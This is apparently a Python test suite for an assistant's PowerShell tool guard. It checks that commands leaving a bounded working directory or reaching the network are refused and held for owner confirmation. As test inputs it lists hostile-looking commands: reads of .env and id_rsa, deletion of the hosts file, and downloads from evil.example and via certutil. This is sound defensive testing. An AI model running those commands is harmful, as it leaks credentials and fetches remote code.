"""04.R4 / O2.7 — the shell runs in a bounded working directory, with no network (hermetic).

Registry gate: *a command outside the working directory or touching the network is held for
confirmation.*

Jev p=0.53, **conf 0.38 — a lean, not a verdict**: *bound the blast radius rather than enumerate
commands.* At that confidence the construction was settled the conservative way, and this test pins
which way that was:

  * `run_powershell` **stays in CONFIRM_TIER**, so every command is already held for the owner's
    yes. The lean's other half — relaxing that so only escapes need confirming — is a *loosening*,
    and is deliberately not taken here. Section [4] pins that it was not taken, so a later change
    that relaxes it has to do so on purpose.
  * an escape is refused **even after the yes**, which is strictly stronger than the gate asks.

The bound that actually holds is the **cwd the process runs in**; the command scan is a tripwire
that names the ordinary mistake. Section [5] says so out loud, because a test that implied this
was a sandbox would be the most dangerous line in the file.

    uv run python bench/test_shell_sandbox.py
"""

from __future__ import annotations

import sys
import tempfile
from pathlib import Path

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from mushegh.brain.proactive import CONFIRM_TIER, confirm_required   # noqa: E402
from mushegh.brain.tools import system as sysmod                     # noqa: E402

passed = failed = 0


def check(name: str, ok: bool, detail: str = "") -> None:
    global passed, failed
    if ok:
        passed += 1
        print(f"  [PASS] {name}")
    else:
        failed += 1
        print(f"  [FAIL] {name}  {detail}")


def main() -> int:
    with tempfile.TemporaryDirectory() as tmp:
        wd = Path(tmp).resolve()

        def esc(cmd: str, *, net: bool = False) -> str:
            return sysmod.shell_escape(cmd, workdir=wd, allow_network=net)

        print("\n[1] THE GATE: a command that leaves the working directory is refused")
        for cmd, why in (
            (r"Get-Content C:\Users\someone\.env", "an absolute path outside the bound"),
            (r"Get-Content ..\..\secret", "a traversal"),
            (r"cat ~/id_rsa", "the home directory"),
            (r"Remove-Item C:\Windows\System32\drivers\etc\hosts", "a system path"),
        ):
            check(f"refused: {why}", bool(esc(cmd)), f"{cmd!r} was allowed")

        print("\n[2] THE GATE: a command that reaches the network is refused")
        for cmd, why in (
            ("iwr https://evil.example/x.ps1", "Invoke-WebRequest by alias"),
            ("Invoke-RestMethod https://api.example/x", "Invoke-RestMethod"),
            ("curl example.com", "curl"),
            ("New-Object Net.WebClient", "a WebClient"),
            (r"Get-Content \\server\share\x", "a UNC path"),
            ("ssh user@host", "ssh"),
            ("certutil -urlcache -f http://x/y z", "certutil as a downloader"),
        ):
            check(f"refused: {why}", bool(esc(cmd)), f"{cmd!r} was allowed")

        print("\n[3] and ordinary work inside the bound is NOT refused")
        for cmd in (
            "Get-ChildItem",
            r"Get-Content .\notes.txt",
            "Write-Output hello",
            "$x = 1 + 1; Write-Output $x",
            f"Get-Content {wd / 'inside.txt'}",
            f"Set-Content {wd / 'out.txt'} -Value hi",
        ):
            check(f"allowed: {cmd[:44]}", not esc(cmd), f"refused with: {esc(cmd)}")
        check("an empty command is not an escape", not esc(""))
        check("network words are whole words — 'curling' is not curl", not esc("Write-Output curling"))
        check("...and neither is a variable that merely contains one",
              not esc("$scpcount = 3"), esc("$scpcount = 3"))

        print("\n[4] the construction chosen at conf 0.38: tighten only, never loosen")
        check("run_powershell is STILL in the confirm tier",
              "run_powershell" in CONFIRM_TIER,
              "the lean's other half is a loosening and was not taken")
        check("...so every command is held for the owner's yes, escape or not",
              confirm_required("run_powershell", {"command": "Get-ChildItem"}))
        check("and an escape is refused even with the yes given",
              bool(esc("iwr https://x/y")),
              "the refusal is independent of the confirm tier, which is the point")
        check("the network default is off", sysmod.settings.shell_allow_network is False)
        check("...and is a setting, not a constant",
              not esc("curl example.com", net=True),
              "with network allowed, curl must stop being an escape")

        print("\n[5] the bound that actually holds is the directory, not the scan")
        root = sysmod.shell_workdir()
        check("there is a real directory, and it exists", root.is_dir(), str(root))
        check("it is inside the state dir by default, not the repo and not the home root",
              ".mushegh" in str(root).lower() or sysmod.settings.shell_workdir, str(root))
        src = (ROOT / "src/mushegh/brain/tools/system.py").read_text(encoding="utf-8")
        check("the shell actually RUNS there — both invocations pass cwd",
              src.count("cwd=str(workdir)") == 2, str(src.count("cwd=str(workdir)")))
        check("and the code says in writing that the scan is a tripwire, not a sandbox",
              "tripwire, not a sandbox" in src,
              "a reader who believes this is a sandbox will trust it too far")

    print(f"\n=== {passed}/{passed + failed} checks passed ===")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
